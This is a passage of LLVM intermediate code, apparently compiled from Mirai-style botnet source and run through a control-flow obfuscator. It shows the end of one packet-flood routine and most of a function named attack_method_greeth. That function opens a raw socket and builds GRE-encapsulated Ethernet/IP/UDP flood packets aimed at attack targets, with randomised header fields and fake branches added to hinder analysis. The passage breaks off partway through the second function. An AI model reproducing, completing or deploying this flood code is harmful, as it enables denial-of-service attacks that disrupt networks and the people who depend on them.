; <label>:609:                                    ; preds = %originalBBpart2, %78
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %84
  %610 = load i32, i32* %10, align 4
  %611 = call i32 @close(i32 %610)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %109
  %612 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %613 = load i8**, i8*** %11, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds i8*, i8** %613, i64 %615
  store i8* %612, i8** %616, align 8
  %617 = load i8**, i8*** %11, align 8
  %618 = load i32, i32* %9, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds i8*, i8** %617, i64 %619
  %621 = load i8*, i8** %620, align 8
  %622 = bitcast i8* %621 to %struct.iphdr*
  store %struct.iphdr* %622, %struct.iphdr** %22, align 8
  %623 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %624 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %623, i64 1
  %625 = bitcast %struct.iphdr* %624 to %struct.grehdr*
  store %struct.grehdr* %625, %struct.grehdr** %23, align 8
  %626 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %627 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %626, i64 1
  %628 = bitcast %struct.grehdr* %627 to %struct.iphdr*
  store %struct.iphdr* %628, %struct.iphdr** %24, align 8
  %629 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %630 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %629, i64 1
  %631 = bitcast %struct.iphdr* %630 to %struct.udphdr*
  store %struct.udphdr* %631, %struct.udphdr** %25, align 8
  %632 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %633 = bitcast %struct.iphdr* %632 to i8*
  %634 = load i8, i8* %633, align 4
  %_ = sub i8 %634, 15
  %gen = mul i8 %_, 15
  %_2 = shl i8 %634, 15
  %635 = and i8 %634, 15
  %_3 = shl i8 %635, 64
  %_4 = shl i8 %635, 64
  %636 = or i8 %635, 64
  store i8 %636, i8* %633, align 4
  %637 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %638 = bitcast %struct.iphdr* %637 to i8*
  %639 = load i8, i8* %638, align 4
  %_5 = shl i8 %639, -16
  %640 = and i8 %639, -16
  %_6 = shl i8 %640, 5
  %_7 = shl i8 %640, 5
  %_8 = shl i8 %640, 5
  %_9 = sub i8 0, %640
  %gen10 = add i8 %_9, 5
  %_11 = sub i8 0, %640
  %gen12 = add i8 %_11, 5
  %_13 = shl i8 %640, 5
  %641 = or i8 %640, 5
  store i8 %641, i8* %638, align 4
  %642 = load i8, i8* %12, align 1
  %643 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %644 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %643, i32 0, i32 1
  store i8 %642, i8* %644, align 1
  %645 = load i32, i32* %18, align 4
  %646 = sext i32 %645 to i64
  %_14 = sub i64 0, 52
  %gen15 = add i64 %_14, %646
  %_16 = sub i64 0, 52
  %gen17 = add i64 %_16, %646
  %_18 = sub i64 52, %646
  %gen19 = mul i64 %_18, %646
  %_20 = shl i64 52, %646
  %647 = add i64 52, %646
  %648 = trunc i64 %647 to i16
  %649 = call zeroext i16 @htons(i16 zeroext %648) #7
  %650 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %651 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %650, i32 0, i32 2
  store i16 %649, i16* %651, align 2
  %652 = load i16, i16* %13, align 2
  %653 = call zeroext i16 @htons(i16 zeroext %652) #7
  %654 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %655 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %654, i32 0, i32 3
  store i16 %653, i16* %655, align 4
  %656 = load i8, i8* %14, align 1
  %657 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %658 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %657, i32 0, i32 5
  store i8 %656, i8* %658, align 4
  %659 = load i8, i8* %15, align 1
  %660 = icmp ne i8 %659, 0
  br label %originalBB1

originalBB24alteredBB:                            ; preds = %originalBB24, %232
  %661 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %662 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %661, i32 0, i32 6
  store i8 17, i8* %662, align 1
  %663 = call i32 @rand_next()
  %664 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %665 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %664, i32 0, i32 8
  store i32 %663, i32* %665, align 4
  %666 = load i8, i8* %20, align 1
  %667 = icmp ne i8 %666, 0
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %290
  store i32 0, i32* %9, align 4
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %312
  %668 = load i8**, i8*** %11, align 8
  %669 = load i32, i32* %9, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds i8*, i8** %668, i64 %670
  %672 = load i8*, i8** %671, align 8
  store i8* %672, i8** %26, align 8
  %673 = load i8*, i8** %26, align 8
  %674 = bitcast i8* %673 to %struct.iphdr*
  store %struct.iphdr* %674, %struct.iphdr** %27, align 8
  %675 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %676 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %675, i64 1
  %677 = bitcast %struct.iphdr* %676 to %struct.grehdr*
  store %struct.grehdr* %677, %struct.grehdr** %28, align 8
  %678 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %679 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %678, i64 1
  %680 = bitcast %struct.grehdr* %679 to %struct.iphdr*
  store %struct.iphdr* %680, %struct.iphdr** %29, align 8
  %681 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %682 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %681, i64 1
  %683 = bitcast %struct.iphdr* %682 to %struct.udphdr*
  store %struct.udphdr* %683, %struct.udphdr** %30, align 8
  %684 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %685 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %684, i64 1
  %686 = bitcast %struct.udphdr* %685 to i8*
  store i8* %686, i8** %31, align 8
  %687 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %688 = load i32, i32* %9, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %687, i64 %689
  %691 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %690, i32 0, i32 2
  %692 = load i8, i8* %691, align 4
  %693 = zext i8 %692 to i32
  %694 = icmp slt i32 %693, 32
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %377
  %695 = load i32, i32* %21, align 4
  %696 = icmp eq i32 %695, -1
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %400
  %697 = load i16, i16* %13, align 2
  %698 = zext i16 %697 to i32
  %699 = icmp eq i32 %698, 65535
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %445
  %700 = load i16, i16* %17, align 2
  %701 = zext i16 %700 to i32
  %702 = icmp eq i32 %701, 65535
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %465
  %703 = call i32 @rand_next()
  %_49 = shl i32 %703, 65535
  %_50 = sub i32 %703, 65535
  %gen51 = mul i32 %_50, 65535
  %704 = and i32 %703, 65535
  %705 = trunc i32 %704 to i16
  %706 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %707 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %706, i32 0, i32 1
  store i16 %705, i16* %707, align 2
  br label %originalBB48

originalBB55alteredBB:                            ; preds = %originalBB55, %494
  %708 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %709 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %708, i32 0, i32 9
  %710 = load i32, i32* %709, align 4
  %711 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %712 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %711, i32 0, i32 9
  store i32 %710, i32* %712, align 4
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %592
  br label %originalBB59
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %680

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %680

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %332, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %335

; <label>:101:                                    ; preds = %96
  %102 = load i32, i32* @x.21
  %103 = load i32, i32* @y.22
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %101
  %110 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %22, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.grehdr*
  store %struct.grehdr* %123, %struct.grehdr** %23, align 8
  %124 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %125 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %124, i64 1
  %126 = bitcast %struct.grehdr* %125 to %struct.ethhdr*
  store %struct.ethhdr* %126, %struct.ethhdr** %24, align 8
  %127 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %128 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %127, i64 1
  %129 = bitcast %struct.ethhdr* %128 to %struct.iphdr*
  store %struct.iphdr* %129, %struct.iphdr** %25, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i64 1
  %132 = bitcast %struct.iphdr* %131 to %struct.udphdr*
  store %struct.udphdr* %132, %struct.udphdr** %26, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, 15
  %137 = or i8 %136, 64
  store i8 %137, i8* %134, align 4
  %138 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, -16
  %142 = or i8 %141, 5
  store i8 %142, i8* %139, align 4
  %143 = load i8, i8* %12, align 1
  %144 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 1
  store i8 %143, i8* %145, align 1
  %146 = load i32, i32* %18, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 66, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i16, i16* %13, align 2
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 3
  store i16 %154, i16* %156, align 4
  %157 = load i8, i8* %14, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 5
  store i8 %157, i8* %159, align 4
  %160 = load i8, i8* %15, align 1
  %161 = icmp ne i8 %160, 0
  %162 = load i32, i32* @x.21
  %163 = load i32, i32* @y.22
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %161, label %170, label %174

; <label>:170:                                    ; preds = %originalBBpart2
  %171 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 4
  store i16 %171, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %170, %originalBBpart2
  %175 = load i32, i32* @x.21
  %176 = load i32, i32* @y.22
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %174
  %183 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 6
  store i8 47, i8* %184, align 1
  %185 = load i32, i32* %21, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %188 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i32 0, i32 1
  %193 = load i32, i32* %192, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 9
  store i32 %193, i32* %195, align 4
  %196 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %197 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %198 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %197, i32 0, i32 1
  store i16 %196, i16* %198, align 2
  %199 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %200 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %201 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 1
  %202 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %203 = bitcast %struct.iphdr* %202 to i8*
  %204 = load i8, i8* %203, align 4
  %205 = and i8 %204, 15
  %206 = or i8 %205, 64
  store i8 %206, i8* %203, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = bitcast %struct.iphdr* %207 to i8*
  %209 = load i8, i8* %208, align 4
  %210 = and i8 %209, -16
  %211 = or i8 %210, 5
  store i8 %211, i8* %208, align 4
  %212 = load i8, i8* %12, align 1
  %213 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 1
  store i8 %212, i8* %214, align 1
  %215 = load i32, i32* %18, align 4
  %216 = sext i32 %215 to i64
  %217 = add i64 28, %216
  %218 = trunc i64 %217 to i16
  %219 = call zeroext i16 @htons(i16 zeroext %218) #7
  %220 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 2
  store i16 %219, i16* %221, align 2
  %222 = load i16, i16* %13, align 2
  %223 = zext i16 %222 to i32
  %224 = xor i32 %223, -1
  %225 = trunc i32 %224 to i16
  %226 = call zeroext i16 @htons(i16 zeroext %225) #7
  %227 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i32 0, i32 3
  store i16 %226, i16* %228, align 4
  %229 = load i8, i8* %14, align 1
  %230 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 5
  store i8 %229, i8* %231, align 4
  %232 = load i8, i8* %15, align 1
  %233 = icmp ne i8 %232, 0
  %234 = load i32, i32* @x.21
  %235 = load i32, i32* @y.22
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart268, label %originalBB34alteredBB

originalBBpart268:                                ; preds = %originalBB34
  br i1 %233, label %242, label %262

; <label>:242:                                    ; preds = %originalBBpart268
  %243 = load i32, i32* @x.21
  %244 = load i32, i32* @y.22
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %242
  %251 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 4
  store i16 %251, i16* %253, align 2
  %254 = load i32, i32* @x.21
  %255 = load i32, i32* @y.22
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %262

; <label>:262:                                    ; preds = %originalBBpart272, %originalBBpart268
  %263 = load i32, i32* @x.21
  %264 = load i32, i32* @y.22
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %262
  %271 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 6
  store i8 17, i8* %272, align 1
  %273 = call i32 @rand_next()
  %274 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 8
  store i32 %273, i32* %275, align 4
  %276 = load i8, i8* %20, align 1
  %277 = icmp ne i8 %276, 0
  %278 = load i32, i32* @x.21
  %279 = load i32, i32* @y.22
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %277, label %286, label %292

; <label>:286:                                    ; preds = %originalBBpart276
  %287 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 9
  %289 = load i32, i32* %288, align 4
  %290 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 9
  store i32 %289, i32* %291, align 4
  br label %300

; <label>:292:                                    ; preds = %originalBBpart276
  %293 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 8
  %295 = load i32, i32* %294, align 4
  %296 = sub i32 %295, 1024
  %297 = xor i32 %296, -1
  %298 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 9
  store i32 %297, i32* %299, align 4
  br label %300

; <label>:300:                                    ; preds = %292, %286
  %301 = load i32, i32* @x.21
  %302 = load i32, i32* @y.22
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %300
  %309 = load i16, i16* %16, align 2
  %310 = call zeroext i16 @htons(i16 zeroext %309) #7
  %311 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %312 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %311, i32 0, i32 0
  store i16 %310, i16* %312, align 2
  %313 = load i16, i16* %17, align 2
  %314 = call zeroext i16 @htons(i16 zeroext %313) #7
  %315 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %316 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %315, i32 0, i32 1
  store i16 %314, i16* %316, align 2
  %317 = load i32, i32* %18, align 4
  %318 = sext i32 %317 to i64
  %319 = add i64 8, %318
  %320 = trunc i64 %319 to i16
  %321 = call zeroext i16 @htons(i16 zeroext %320) #7
  %322 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 2
  store i16 %321, i16* %323, align 2
  %324 = load i32, i32* @x.21
  %325 = load i32, i32* @y.22
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBBpart282, label %originalBB78alteredBB

originalBBpart282:                                ; preds = %originalBB78
  br label %332

; <label>:332:                                    ; preds = %originalBBpart282
  %333 = load i32, i32* %9, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %9, align 4
  br label %96

; <label>:335:                                    ; preds = %96
  %336 = load i32, i32* @x.21
  %337 = load i32, i32* @y.22
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %335
  %344 = load i32, i32* @x.21
  %345 = load i32, i32* @y.22
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %352

; <label>:352:                                    ; preds = %originalBBpart2136, %originalBBpart286
  store i32 0, i32* %9, align 4
  br label %353

; <label>:353:                                    ; preds = %660, %352
  %354 = load i32, i32* %9, align 4
  %355 = load i8, i8* %5, align 1
  %356 = zext i8 %355 to i32
  %357 = icmp slt i32 %354, %356
  br i1 %357, label %358, label %663

; <label>:358:                                    ; preds = %353
  %359 = load i32, i32* @x.21
  %360 = load i32, i32* @y.22
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %358
  %367 = load i8**, i8*** %11, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
